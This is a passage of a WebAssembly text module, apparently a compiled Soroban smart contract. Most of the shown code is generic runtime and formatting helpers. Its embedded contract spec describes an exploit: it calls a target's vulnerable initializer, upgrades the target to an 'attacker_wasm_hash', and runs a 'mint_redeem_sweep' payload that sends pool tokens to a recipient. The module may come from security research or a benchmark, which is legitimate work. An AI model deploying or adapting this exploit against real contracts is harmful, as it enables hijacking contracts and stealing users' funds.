            i32.const 1
            i32.store8
            return
          end
          local.get 1
          i32.const -59
          i32.add
          local.set 2
          br 2 (;@1;)
        end
        local.get 1
        i32.const -53
        i32.add
        local.set 2
        br 1 (;@1;)
      end
      local.get 1
      i32.const -46
      i32.add
      local.set 2
    end
    local.get 0
    i32.const 3
    i32.store8
    local.get 0
    local.get 2
    i32.store8 offset=1
  )
  (func (;53;) (type 23) (param i64) (result i32)
    local.get 0
    i64.const 32
    i64.shr_u
    i32.wrap_i64
  )
  (func (;54;) (type 12) (param i32 i64)
    local.get 0
    local.get 1
    i64.const 63
    i64.shr_s
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const 8
    i64.shr_s
    i64.store
  )
  (func (;55;) (type 24) (param i32 i64 i64)
    local.get 0
    local.get 1
    i64.const 8
    i64.shl
    i64.const 11
    i64.or
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const -36028797018963968
    i64.add
    i64.const -72057594037927936
    i64.lt_u
    local.get 1
    i64.const 63
    i64.shr_s
    local.get 2
    i64.xor
    i64.const 0
    i64.ne
    i32.or
    i64.extend_i32_u
    i64.store
  )
  (func (;56;) (type 22) (param i32 i32)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    i32.const 16
    i32.add
    local.get 0
    i32.const 16
    i32.add
    i64.load align=4
    i64.store
    local.get 2
    i32.const 8
    i32.add
    local.get 0
    i32.const 8
    i32.add
    i64.load align=4
    i64.store
    local.get 2
    i32.const 1
    i32.store16 offset=28
    local.get 2
    local.get 1
    i32.store offset=24
    local.get 2
    local.get 0
    i64.load align=4
    i64.store
    local.get 2
    call 27
    unreachable
  )
  (func (;57;) (type 0) (param i32 i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32)
    block ;; label = @1
      local.get 0
      i32.load
      local.tee 3
      local.get 0
      i32.load offset=8
      local.tee 4
      i32.or
      i32.eqz
      br_if 0 (;@1;)
      block ;; label = @2
        local.get 4
        i32.eqz
        br_if 0 (;@2;)
        local.get 1
        local.get 2
        i32.add
        local.set 5
        block ;; label = @3
          block ;; label = @4
            local.get 0
            i32.load offset=12
            local.tee 6
            br_if 0 (;@4;)
            i32.const 0
            local.set 7
            local.get 1
            local.set 8
            br 1 (;@3;)
          end
          i32.const 0
          local.set 7
          local.get 1
          local.set 8
          loop ;; label = @4
            local.get 8
            local.tee 4
            local.get 5
            i32.eq
            br_if 2 (;@2;)
            block ;; label = @5
              block ;; label = @6
                local.get 4
                i32.load8_s
                local.tee 8
                i32.const -1
                i32.le_s
                br_if 0 (;@6;)
                local.get 4
                i32.const 1
                i32.add
                local.set 8
                br 1 (;@5;)
              end
              block ;; label = @6
                local.get 8
                i32.const -32
                i32.ge_u
                br_if 0 (;@6;)
                local.get 4
                i32.const 2
                i32.add
                local.set 8
                br 1 (;@5;)
              end
              block ;; label = @6
                local.get 8
                i32.const -16
                i32.ge_u
                br_if 0 (;@6;)
                local.get 4
                i32.const 3
                i32.add
                local.set 8
                br 1 (;@5;)
              end
              local.get 4
              i32.const 4
              i32.add
              local.set 8
            end
            local.get 8
            local.get 4
            i32.sub
            local.get 7
            i32.add
            local.set 7
            local.get 6
            i32.const -1
            i32.add
            local.tee 6
            br_if 0 (;@4;)
          end
        end
        local.get 8
        local.get 5
        i32.eq
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 8
          i32.load8_s
          local.tee 4
          i32.const -1
          i32.gt_s
          br_if 0 (;@3;)
          local.get 4
          i32.const -32
          i32.lt_u
          drop
        end
        block ;; label = @3
          block ;; label = @4
            local.get 7
            i32.eqz
            br_if 0 (;@4;)
            block ;; label = @5
              local.get 7
              local.get 2
              i32.ge_u
              br_if 0 (;@5;)
              i32.const 0
              local.set 4
              local.get 1
              local.get 7
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              br_if 1 (;@4;)
              br 2 (;@3;)
            end
            i32.const 0
            local.set 4
            local.get 7
            local.get 2
            i32.ne
            br_if 1 (;@3;)
          end
          local.get 1
          local.set 4
        end
        local.get 7
        local.get 2
        local.get 4
        select
        local.set 2
        local.get 4
        local.get 1
        local.get 4
        select
        local.set 1
      end
      block ;; label = @2
        local.get 3
        br_if 0 (;@2;)
        local.get 0
        i32.load offset=20
        local.get 1
        local.get 2
        local.get 0
        i32.load offset=24
        i32.load offset=12
        call_indirect (type 0)
        return
      end
      local.get 0
      i32.load offset=4
      local.set 3
      block ;; label = @2
        block ;; label = @3
          local.get 2
          i32.const 16
          i32.lt_u
          br_if 0 (;@3;)
          local.get 1
          local.get 2
          call 61
          local.set 4
          br 1 (;@2;)
        end
        block ;; label = @3
          local.get 2
          br_if 0 (;@3;)
          i32.const 0
          local.set 4
          br 1 (;@2;)
        end
        local.get 2
        i32.const 3
        i32.and
        local.set 6
        block ;; label = @3
          block ;; label = @4
            local.get 2
            i32.const 4
            i32.ge_u
            br_if 0 (;@4;)
            i32.const 0
            local.set 4
            i32.const 0
            local.set 7
            br 1 (;@3;)
          end
          local.get 2
          i32.const 12
          i32.and
          local.set 5
          i32.const 0
          local.set 4
          i32.const 0
          local.set 7
          loop ;; label = @4
            local.get 4
            local.get 1
            local.get 7
            i32.add
            local.tee 8
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.get 8
            i32.const 1
            i32.add
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.get 8
            i32.const 2
            i32.add
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.get 8
            i32.const 3
            i32.add
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.set 4
            local.get 5
            local.get 7
            i32.const 4
            i32.add
            local.tee 7
            i32.ne
            br_if 0 (;@4;)
          end
        end
        local.get 6
        i32.eqz
        br_if 0 (;@2;)
        local.get 1
        local.get 7
        i32.add
        local.set 8
        loop ;; label = @3
          local.get 4
          local.get 8
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.set 4
          local.get 8
          i32.const 1
          i32.add
          local.set 8
          local.get 6
          i32.const -1
          i32.add
          local.tee 6
          br_if 0 (;@3;)
        end
      end
      block ;; label = @2
        block ;; label = @3
          local.get 3
          local.get 4
          i32.le_u
          br_if 0 (;@3;)
          local.get 3
          local.get 4
          i32.sub
          local.set 5
          i32.const 0
          local.set 4
          block ;; label = @4
            block ;; label = @5
              block ;; label = @6
                local.get 0
                i32.load8_u offset=32
                br_table 2 (;@4;) 0 (;@6;) 1 (;@5;) 2 (;@4;) 2 (;@4;)
              end
              local.get 5
              local.set 4
              i32.const 0
              local.set 5
              br 1 (;@4;)
            end
            local.get 5
            i32.const 1
            i32.shr_u
            local.set 4
            local.get 5
            i32.const 1
            i32.add
            i32.const 1
            i32.shr_u
            local.set 5
          end
          local.get 4
          i32.const 1
          i32.add
          local.set 4
          local.get 0
          i32.load offset=16
          local.set 6
          local.get 0
          i32.load offset=24
          local.set 8
          local.get 0
          i32.load offset=20
          local.set 7
          loop ;; label = @4
            local.get 4
            i32.const -1
            i32.add
            local.tee 4
            i32.eqz
            br_if 2 (;@2;)
            local.get 7
            local.get 6
            local.get 8
            i32.load offset=16
            call_indirect (type 1)
            i32.eqz
            br_if 0 (;@4;)
          end
          i32.const 1
          return
        end
        local.get 0
        i32.load offset=20
        local.get 1
        local.get 2
        local.get 0
        i32.load offset=24
        i32.load offset=12
        call_indirect (type 0)
        return
      end
      i32.const 1
      local.set 4
      block ;; label = @2
        local.get 7
        local.get 1
        local.get 2
        local.get 8
        i32.load offset=12
        call_indirect (type 0)
        br_if 0 (;@2;)
        i32.const 0
        local.set 4
        block ;; label = @3
          loop ;; label = @4
            block ;; label = @5
              local.get 5
              local.get 4
              i32.ne
              br_if 0 (;@5;)
              local.get 5
              local.set 4
              br 2 (;@3;)
            end
            local.get 4
            i32.const 1
            i32.add
            local.set 4
            local.get 7
            local.get 6
            local.get 8
            i32.load offset=16
            call_indirect (type 1)
            i32.eqz
            br_if 0 (;@4;)
          end
          local.get 4
          i32.const -1
          i32.add
          local.set 4
        end
        local.get 4
        local.get 5
        i32.lt_u
        local.set 4
      end
      local.get 4
      return
    end
    local.get 0
    i32.load offset=20
    local.get 1
    local.get 2
    local.get 0
    i32.load offset=24
    i32.load offset=12
    call_indirect (type 0)
  )
  (func (;58;) (type 11) (param i32 i32 i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 1
    i32.store offset=12
    local.get 5
    local.get 0
    i32.store offset=8
    local.get 5
    local.get 3
    i32.store offset=20
    local.get 5
    local.get 2
    i32.store offset=16
    local.get 5
    i32.const 2
    i32.store offset=28
    local.get 5
    i32.const 1049020
    i32.store offset=24
    local.get 5
    i64.const 2
    i64.store offset=36 align=4
    local.get 5
    i32.const 3
    i64.extend_i32_u
    i64.const 32
    i64.shl
    local.get 5
    i32.const 16
    i32.add
    i64.extend_i32_u
    i64.or
    i64.store offset=56
    local.get 5
    i32.const 4
    i64.extend_i32_u
    i64.const 32
    i64.shl
    local.get 5
    i32.const 8
    i32.add
    i64.extend_i32_u
    i64.or
    i64.store offset=48
    local.get 5
    local.get 5
    i32.const 48
    i32.add
    i32.store offset=32
    local.get 5
    i32.const 24
    i32.add
    local.get 4
    call 56
    unreachable
  )
  (func (;59;) (type 1) (param i32 i32) (result i32)
    local.get 1
    local.get 0
    i32.load
    local.get 0
    i32.load offset=4
    call 57
  )
  (func (;60;) (type 1) (param i32 i32) (result i32)
    local.get 0
    i32.load
    local.get 1
    local.get 0
    i32.load offset=4
    i32.load offset=12
    call_indirect (type 1)
  )
  (func (;61;) (type 1) (param i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32 i32)
    block ;; label = @1
      block ;; label = @2
        local.get 1
        local.get 0
        i32.const 3
        i32.add
        i32.const -4
        i32.and
        local.tee 2
        local.get 0
        i32.sub
        local.tee 3
        i32.lt_u
        br_if 0 (;@2;)
        local.get 1
        local.get 3
        i32.sub
        local.tee 4
        i32.const 4
        i32.lt_u
        br_if 0 (;@2;)
        local.get 4
        i32.const 3
        i32.and
        local.set 5
        i32.const 0
        local.set 6
        i32.const 0
        local.set 1
        block ;; label = @3
          local.get 2
          local.get 0
          i32.eq
          local.tee 7
          br_if 0 (;@3;)
          i32.const 0
          local.set 1
          block ;; label = @4
            block ;; label = @5
              local.get 0
              local.get 2
              i32.sub
              local.tee 8
              i32.const -4
              i32.le_u
              br_if 0 (;@5;)
              i32.const 0
              local.set 9
              br 1 (;@4;)
            end
            i32.const 0
            local.set 9
            loop ;; label = @5
              local.get 1
              local.get 0
              local.get 9
              i32.add
              local.tee 2
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 1
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 2
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.get 2
              i32.const 3
              i32.add
              i32.load8_s
              i32.const -65
              i32.gt_s
              i32.add
              local.set 1
              local.get 9
              i32.const 4
              i32.add
              local.tee 9
              br_if 0 (;@5;)
            end
          end
          local.get 7
          br_if 0 (;@3;)
          local.get 0
          local.get 9
          i32.add
          local.set 2
          loop ;; label = @4
            local.get 1
            local.get 2
            i32.load8_s
            i32.const -65
            i32.gt_s
            i32.add
            local.set 1
            local.get 2
            i32.const 1
            i32.add
            local.set 2
            local.get 8
            i32.const 1
            i32.add
            local.tee 8
            br_if 0 (;@4;)
          end
        end
        local.get 0
        local.get 3
        i32.add
        local.set 9
        block ;; label = @3
          local.get 5
          i32.eqz
          br_if 0 (;@3;)
          local.get 9
          local.get 4
          i32.const -4
          i32.and
          i32.add
          local.tee 2
          i32.load8_s
          i32.const -65
          i32.gt_s
          local.set 6
          local.get 5
          i32.const 1
          i32.eq
          br_if 0 (;@3;)
          local.get 6
          local.get 2
          i32.load8_s offset=1
          i32.const -65
          i32.gt_s
          i32.add
          local.set 6
          local.get 5
          i32.const 2
          i32.eq
          br_if 0 (;@3;)
          local.get 6
          local.get 2
          i32.load8_s offset=2
          i32.const -65
          i32.gt_s
          i32.add
          local.set 6
        end
        local.get 4
        i32.const 2
        i32.shr_u
        local.set 3
        local.get 6
        local.get 1
        i32.add
        local.set 8
        loop ;; label = @3
          local.get 9
          local.set 4
          local.get 3
          i32.eqz
          br_if 2 (;@1;)
          local.get 3
          i32.const 192
          local.get 3
          i32.const 192
          i32.lt_u
          select
          local.tee 6
          i32.const 3
          i32.and
          local.set 7
          local.get 6
          i32.const 2
          i32.shl
          local.set 5
          i32.const 0
          local.set 2
          block ;; label = @4
            local.get 3
            i32.const 4
            i32.lt_u
            br_if 0 (;@4;)
            local.get 4
            local.get 5
            i32.const 1008
            i32.and
            i32.add
            local.set 0
            i32.const 0
            local.set 2
            local.get 4
            local.set 1
            loop ;; label = @5
              local.get 1
              i32.load offset=12
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.load offset=8
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.load offset=4
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 1
              i32.load
              local.tee 9
              i32.const -1
              i32.xor
              i32.const 7
              i32.shr_u
              local.get 9
              i32.const 6
              i32.shr_u
              i32.or
              i32.const 16843009
              i32.and
              local.get 2
              i32.add
              i32.add
              i32.add
              i32.add
              local.set 2
              local.get 1
              i32.const 16
              i32.add
              local.tee 1
              local.get 0
              i32.ne
              br_if 0 (;@5;)
            end
          end
          local.get 3
          local.get 6
          i32.sub
          local.set 3
          local.get 4
          local.get 5
          i32.add
          local.set 9
          local.get 2
          i32.const 8
          i32.shr_u
          i32.const 16711935
          i32.and
          local.get 2
          i32.const 16711935
          i32.and
          i32.add
          i32.const 65537
          i32.mul
          i32.const 16
          i32.shr_u
          local.get 8
          i32.add
          local.set 8
          local.get 7
          i32.eqz
          br_if 0 (;@3;)
        end
        local.get 4
        local.get 6
        i32.const 252
        i32.and
        i32.const 2
        i32.shl
        i32.add
        local.tee 2
        i32.load
        local.tee 1
        i32.const -1
        i32.xor
        i32.const 7
        i32.shr_u
        local.get 1
        i32.const 6
        i32.shr_u
        i32.or
        i32.const 16843009
        i32.and
        local.set 1
        block ;; label = @3
          local.get 7
          i32.const 1
          i32.eq
          br_if 0 (;@3;)
          local.get 2
          i32.load offset=4
          local.tee 9
          i32.const -1
          i32.xor
          i32.const 7
          i32.shr_u
          local.get 9
          i32.const 6
          i32.shr_u
          i32.or
          i32.const 16843009
          i32.and
          local.get 1
          i32.add
          local.set 1
          local.get 7
          i32.const 2
          i32.eq
          br_if 0 (;@3;)
          local.get 2
          i32.load offset=8
          local.tee 2
          i32.const -1
          i32.xor
          i32.const 7
          i32.shr_u
          local.get 2
          i32.const 6
          i32.shr_u
          i32.or
          i32.const 16843009
          i32.and
          local.get 1
          i32.add
          local.set 1
        end
        local.get 1
        i32.const 8
        i32.shr_u
        i32.const 459007
        i32.and
        local.get 1
        i32.const 16711935
        i32.and
        i32.add
        i32.const 65537
        i32.mul
        i32.const 16
        i32.shr_u
        local.get 8
        i32.add
        return
      end
      block ;; label = @2
        local.get 1
        br_if 0 (;@2;)
        i32.const 0
        return
      end
      local.get 1
      i32.const 3
      i32.and
      local.set 9
      block ;; label = @2
        block ;; label = @3
          local.get 1
          i32.const 4
          i32.ge_u
          br_if 0 (;@3;)
          i32.const 0
          local.set 8
          i32.const 0
          local.set 2
          br 1 (;@2;)
        end
        local.get 1
        i32.const -4
        i32.and
        local.set 3
        i32.const 0
        local.set 8
        i32.const 0
        local.set 2
        loop ;; label = @3
          local.get 8
          local.get 0
          local.get 2
          i32.add
          local.tee 1
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 1
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 2
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.get 1
          i32.const 3
          i32.add
          i32.load8_s
          i32.const -65
          i32.gt_s
          i32.add
          local.set 8
          local.get 3
          local.get 2
          i32.const 4
          i32.add
          local.tee 2
          i32.ne
          br_if 0 (;@3;)
        end
      end
      local.get 9
      i32.eqz
      br_if 0 (;@1;)
      local.get 0
      local.get 2
      i32.add
      local.set 1
      loop ;; label = @2
        local.get 8
        local.get 1
        i32.load8_s
        i32.const -65
        i32.gt_s
        i32.add
        local.set 8
        local.get 1
        i32.const 1
        i32.add
        local.set 1
        local.get 9
        i32.const -1
        i32.add
        local.tee 9
        br_if 0 (;@2;)
      end
    end
    local.get 8
  )
  (func (;62;) (type 0) (param i32 i32 i32) (result i32)
    local.get 0
    i32.load offset=20
    local.get 1
    local.get 2
    local.get 0
    i32.load offset=24
    i32.load offset=12
    call_indirect (type 0)
  )
  (data (;0;) (i32.const 1048576) "/root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/soroban-sdk-22.0.7/src/env.rs\00\00\10\00X\00\00\00\84\01\00\00\0e\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00called `Result::unwrap()` on an `Err` valueConversionErrorinitialize\00\00\00\00\0ejn\a6\b5\0e\00\00mint_redeem_sweep\00\00\00\00\00\00\00\80\96\98\00\00\00\00\00\00\00\00\00\00\00\00\00d\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0a\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00called `Result::unwrap()` on an `Err` valueConversionError/root/.cargo/registry/src/index.crates.io-6f17d22bba15001f/soroban-sdk-22.0.7/src/env.rs\00\00N\01\10\00X\00\00\00\84\01\00\00\0e\00\00\00: \00\00\01\00\00\00\00\00\00\00\b8\01\10\00\02\00\00\00")
  (@custom "contractspecv0" (after data) "\00\00\00\00\00\00\00uExecute the vulnerable initializer, exact upgrade, and newly installed\0apayload through one outer contract invocation.\00\00\00\00\00\00\07execute\00\00\00\00\08\00\00\00\00\00\00\00\06target\00\00\00\00\00\13\00\00\00\00\00\00\00\12attacker_wasm_hash\00\00\00\00\03\ee\00\00\00 \00\00\00\00\00\00\00\06old_lp\00\00\00\00\00\13\00\00\00\00\00\00\00\04pool\00\00\00\13\00\00\00\00\00\00\00\07token_a\00\00\00\00\13\00\00\00\00\00\00\00\07token_b\00\00\00\00\13\00\00\00\00\00\00\00\09recipient\00\00\00\00\00\00\13\00\00\00\00\00\00\00\06stages\00\00\00\00\03\ea\00\00\00\0b\00\00\00\01\00\00\03\ed\00\00\00\02\00\00\00\0b\00\00\00\0b")
  (@custom "contractenvmetav0" (after data) "\00\00\00\00\00\00\00\16\00\00\00\00")
  (@custom "contractmetav0" (after data) "\00\00\00\00\00\00\00\05rsver\00\00\00\00\00\00\061.81.0\00\00\00\00\00\00\00\00\00\08rssdkver\00\00\00/22.0.7#211569aa49c8d896877dfca1f2eb4fe9071121c8\00")
)
